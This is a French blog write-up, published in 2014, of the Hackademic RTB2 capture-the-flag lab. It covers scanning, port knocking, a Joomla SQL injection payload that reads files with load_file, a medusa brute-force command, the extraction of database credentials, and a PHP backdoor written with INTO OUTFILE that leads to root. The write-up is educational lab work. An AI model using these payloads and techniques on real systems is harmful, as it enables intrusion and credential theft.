# Solution du CTF Hackademic: RTB2

Faux départ
-----------

Le challenge [Hackademic: RTB2](http://vulnhub.com/entry/hackademic_rtb2,18/), qui se veut "réaliste" a montré quelques réticences à m'ouvrir ses portes et j'ai finalement du chercher un indice sur le web pour savoir par où commencer.  

Il s'avère que les autres personnes ayant résolu ce challenge ont découvert le premier point d'entrée par chance, malheureusement je ne devais pas être dans un bon jour.  

En effet lorsque l'on scanne la cible on obtient les résultats suivants :  

```plain
Starting Nmap 6.40 ( http://nmap.org ) at 2014-04-01 19:01 CEST
Nmap scan report for 192.168.1.91
Host is up (0.00025s latency).
Not shown: 998 closed ports
PORT    STATE    SERVICE VERSION
80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Hackademic.RTB2
666/tcp filtered doom
MAC Address: 00:0C:29:51:57:13 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.17 - 2.6.36
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.1.91
```

On remarque immédiatement le port 666 qui est derrière un firewall et qui laisse supposer qu'il y a quelque chose à chercher derrière.  

En fait, un système de port-knocking est présent sur la machine. Il faut tenter d'établir des connexions sur une suite de ports (même fermés) prédéfinis pour provoquer l'ouverture de l'accès au port 666.  

Certains participants ont re-scanné le système plusieurs fois et, comme *Nmap* scanne les ports dans un ordre indéfini, ont eu la chance de voir finalement le port apparaître ouvert, ce qui n'est pas mon cas.  

Il existe bien une façon "officielle" de connaître la présence du port-knocker dans le challenge mais vous verrez qu'elle n'a rien d'évidente et encore moins de réaliste :(  

Coup de gueule mis à part, on s'intéresse d'abord au site web sur le port 80.  

On a une page de login qui soumet via POST les identifiants vers un fichier *check.php*. On lance *Wapiti* pour trouver une vulbérabilité : nada. On teste avec *SQLmap* : pas mieux. *w3af* ? que dalle.  

Du coup on cherche ailleurs en lançant [dirb](http://dirb.sourceforge.net/) (j'ai réduit l'output) :  

```plain
> ./dirb http://192.168.1.91/ wordlists/big.txt 

-----------------
DIRB v2.21    
By The Dark Raver
-----------------

START_TIME: Tue Apr  1 19:23:24 2014
URL_BASE: http://192.168.1.91/
WORDLIST_FILES: wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.1.91/ ----
+ http://192.168.1.91/cgi-bin/ (CODE:403|SIZE:288)                                                                                                                                                            
+ http://192.168.1.91/check (CODE:200|SIZE:324)                                                                                                                                                               
+ http://192.168.1.91/index (CODE:200|SIZE:1324)                                                                                                                                                              
==> DIRECTORY: http://192.168.1.91/javascript/                                                                                                                                                                
==> DIRECTORY: http://192.168.1.91/phpmyadmin/                                                                                                                                                                
+ http://192.168.1.91/server-status (CODE:403|SIZE:293)                                                                                                                                                       
(...)                                                                                                                                                                                                              
-----------------
DOWNLOADED: 347786 - FOUND: 10
```

On voit la présence d'un *phpMyAdmin* installé. Si on demande */phpmyadmin/changelog.php* on obtient facilement la version : *3.3.2.0 (2010-04-13)*  

On trouve quelques exploits sur le web qui pourraient éventuellement affecter cette version mais certains se base sur l'accès aux scripts dans le dossier libraries qui est ici refusé.  

Les exploits de *Metasploit* échouent aussi.  

J'ai testé énormément d'attaques brute-force par exemple en attaquant l'accès au setup de *phpMyAdmin* :  

```plain
medusa -h 192.168.1.91 -U dico.txt -P candidates.txt -m DIR:phpmyadmin/setup -M http
```

et aussi avec un script fait maison pour le *check.php* ainsi que des scripts pour essayer de trouver d'autres fichiers + tentatives d'injection dans les entêtes HTTP.  

Au final j'ai même réussi à faire crasher le serveur *MySQL* en backend :D ce qui m'a poussé à chercher la précieuse astuce.  

Une fois le port 666 ouvert (on relance des scans, jusqu'à avoir de la chance, c'est comme au loto), tout va plus vite.  

On tombe sur une installation *Joomla* (un site sur lequel on voit une signature "Joomla templates" en bas. *Metasploit* a plusieurs modules pour ce CMS :  

```plain
msf> use auxiliary/scanner/http/joomla_plugins
msf auxiliary(joomla_plugins) > show options

Module options (auxiliary/scanner/http/joomla_plugins):

   Name       Current Setting                                               Required  Description
   ----       ---------------                                               --------  -----------
   PLUGINS    /data/metasploit-4.9/apps/pro/msf3/data/wordlists/joomla.txt  yes       Path to list of plugins to enumerate
   Proxies                                                                  no        Use a proxy chain
   RHOSTS                                                                   yes       The target address range or CIDR identifier
   RPORT      666                                                           yes       The target port
   TARGETURI  /                                                             yes       The path to the Joomla install
   THREADS    1                                                             yes       The number of concurrent threads
   VHOST                                                                    no        HTTP server virtual host

msf auxiliary(joomla_plugins) > set RHOSTS 192.168.1.91
RHOSTS => 192.168.1.91
msf auxiliary(joomla_plugins) > exploit

[+] 192.168.1.91:666 - Plugin: /administrator/ 
[+] 192.168.1.91:666 - Plugin: /administrator/index.php?option=com_djartgallery&task=editItem&cid[]=1'+and+1=1+--+ 
[+] 192.168.1.91:666 - Plugin: /administrator/index.php?option=com_searchlog&act=log 
[+] 192.168.1.91:666 - Plugin: /components/com_banners/ 
[+] 192.168.1.91:666 - Page: /index.php?option=com_banners
[+] 192.168.1.91:666 - Plugin: /components/com_content/ 
[+] 192.168.1.91:666 - Page: /index.php?option=com_content
[+] 192.168.1.91:666 - Plugin: /components/com_mailto/ 
[+] 192.168.1.91:666 - Plugin: /components/com_poll/ 
[+] 192.168.1.91:666 - Plugin: /components/com_search/ 
[+] 192.168.1.91:666 - Plugin: /components/com_user/controller.php 
[+] 192.168.1.91:666 - Plugin: /components/com_weblinks/ 
[+] 192.168.1.91:666 - Page: /index.php?option=com_weblinks
[+] 192.168.1.91:666 - Plugin: /includes/joomla.php 
[+] 192.168.1.91:666 - Plugin: /index.php?option=com_abc&view=abc&letter=AS&sectionid=' 
[+] 192.168.1.91:666 - Vulnerability: Potential SQL Injection
```

Le script *Metasploit* crashe à ce moment j'ai au moins il a détecté quelque chose. Au passage *Wapiti* trouve aussi la vulnérabilité mais via une autre variable :

```plain
Injection MySQL dans http://192.168.1.91:666/index.php via une injection dans le paramètre letter
  Evil url: http://192.168.1.91:666/index.php?option=com_abc&view=abc&letter=%BF%27%22%28&Itemid=3
```

Sur *exploit-db* on trouve [un exploit qui permet de récolter les hashs des utilisateurs Joomla](http://www.exploit-db.com/exploits/12429/) et [sur la mailing-list de JtR](http://comments.gmane.org/gmane.comp.security.openwall.john.user/4664), la manipulation pour casser ces hashs.  

On obtient rapidement un premier hash et plus tard un second mais le dernier semble inaccessible :  

```plain
Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 AVX intrinsics 10x4x3])
matrix           (JSmith)
victim           (BTallor)
```

Cela dis, même avec ces comptes on ne trouve pas grand chose d'intéressant dans Joomla qui puisse nous aider à élever nos privilèges ou obtenir un shell.  

On customize un peu l'injection SQL indiquée dans l'exploit en changeant le paramètre de la variable *sectionid*. De cette façon on peut lire le contenu de fichiers sur le système :  

```plain
-null+union+select+1,load_file(%27/etc/apache2/apache2.conf%27)+from+jos_users--
```

La config est basée sur le dossier *sites-enabled* comme sous *openSUSE*. On tente le fichier *default* (*sites-available/default*) :  

```plain
<VirtualHost *:80>
	ServerAdmin webmaster@localhost

	DocumentRoot /var/www/welcome
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

        (...snip...)
</VirtualHost>

<VirtualHost *:666>
	ServerAdmin webmaster@localhost

	DocumentRoot /var/www
	<Directory />
		Options FollowSymLinks
		AllowOverride None
	</Directory>
	<Directory /var/www/>
		Options Indexes FollowSymLinks MultiViews
		AllowOverride None
		Order allow,deny
		allow from all
	</Directory>

        (...snip...)
</VirtualHost>
```

Bingo ! Donc le *Joomla* est dans */var/www* et le site sur le port standard dans le sous-dossier *welcome*.  

Par la même méthode on récupère le password de la base de données via la lecture du fichier de configuration de *Joomla* (*/var/www/configuration.php*) :  

```php
class JConfig {
/* Site Settings */
var $sitename = 'Hackademic.RTB2';
var $editor = 'tinymce';
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
/* Server Settings */
var $live_site = '';
var $secret = 'iFzlVUCg9BBPoUDU';
var $gzip = '0';
(...)
}
```

Avec les identifiants on se connecte sur *phpMyAdmin* puis on place une backdoor PHP via l'utilisation de l'instruction *INTO OUTFILE* :  

![INTO OUTFILE backdoor creation](https://raw.githubusercontent.com/devl00p/blog/master/images/into_outfile.png)

On utilise cette backdoor pour rappatrier un *tshd* et obtenir un accès terminal. On dispose des droits de l'utilisateur *www-data* et on a affaire à un kernel 2.6.32 :  

*Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux*  

Du coup on réutilise l'exploit RDS pour le kernel pour passer root ([comme pour le RTB1](http://devloop.users.sourceforge.net/index.php?article76/solution-du-ctf-hackademic-rtb1)) et quand on affiche le contenu de */root/Key.txt* on a une longue chaîne en base64.  

Une fois le fichier décodé (*base64 -d key.txt > file.out*) on obtient la clé suivante :  

![Image obtenue via decodage base64](https://raw.githubusercontent.com/devl00p/blog/master/images/rtb2_flag.png)

Victoire !  

Sous le capot
-------------

Bon maintenant qu'on a terminé, jettons un coup d'oeil à ce fameux script *check.php* qui m'a tant énervé (j'ai coupé l'output une fois de plus car c'est super long) :  

```php
$pass_answer = "' or 1=1--'";
$pass_answer_2 = "' OR 1=1--'";

if($_POST['password'] == $pass_answer or $_POST['password'] == $pass_answer_2){
        echo '<h2>';
        echo 'Ok, nice shot...';
        echo '<br>';
        echo '</h2>';
        echo '...but, you are looking in a wrong place bro! ;-)';
        echo '<br>';
        echo '<br>';
        echo '<font color="black">';
        echo '%33%63%20%32%64%20%32%64%20%32%64%20%32%64%20(...)%20%32%64%20%32%64%20%33%65%0A';
        echo '</font color="black">';

}

else{
        echo '<h2>';
        echo 'You are trying to login with wrong credentials!';
        echo '<br>';
        echo '</h2>';
        echo "Please try again...";
}
```

Si quelqu'un tente d'injecter la chaine **' or 1=1--'** (apostrophes includes) alors l'indice est donné.  

Sauf que :  

* c'est stupide de mettre une apostrophe en fin alors qu'on ferme la requête via l'utilisation d'un commentaire (wtf !)
* ce n'est pas réaliste du tout car il n'y a pas vraiment de faille
* ce n'est pas réaliste du tout car c'est presque une porte dérobée volontaire
* ça ne fonctionne pas si on rentre par exemple or 1=1 or 2=2

donc quelque part, pas de regrets de ne pas avoir trouvé.  

La chaîne est une représentation hexadécimale qui a été ensuite urlencodée. En sens inverse et avec Python on fait :  

```python
import urllib
print ''.join(urllib.unquote(s).split(' ')).decode("hex_codec")
<--------->
Knock Knock Knockin' on heaven's door .. :)
00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
<--------->
```

Cette fois on a des caractères sous forme binaire. Une fois décodé on remarque un séparateur (:) dont le décodage donne :  

```python
>>> ''.join([chr(int(port, 2)) for port in ports.split(" ")]).split(':')
['1001', '1101', '1011', '1001']
```

A priori les ports sont 1001, 1101, 1011 puis 1001 pour provoquer l'ouverture du port 666. Cela dis ils sont mal choisis car ils laissent supposer qu'on a encore affaire à du binaire.  

A noter que le fichier de configuration de [knockkock](http://www.thoughtcrime.org/software/knockknock/) présent sur le système ne correspond pas à ces ports :  

```plain
[options]
        UseSyslog

[openHTTPD]
        sequence    = 7000,8000,9000
        seq_timeout = 5
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
        tcpflags    = syn

[closeHTTPD]
        sequence    = 9000,8000,7000
        seq_timeout = 5
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
        tcpflags    = syn
```

Bon, je pense que je vais mettre une sous-section CTF directement dans la page articles du site :p

*Published April 04 2014 at 16:48*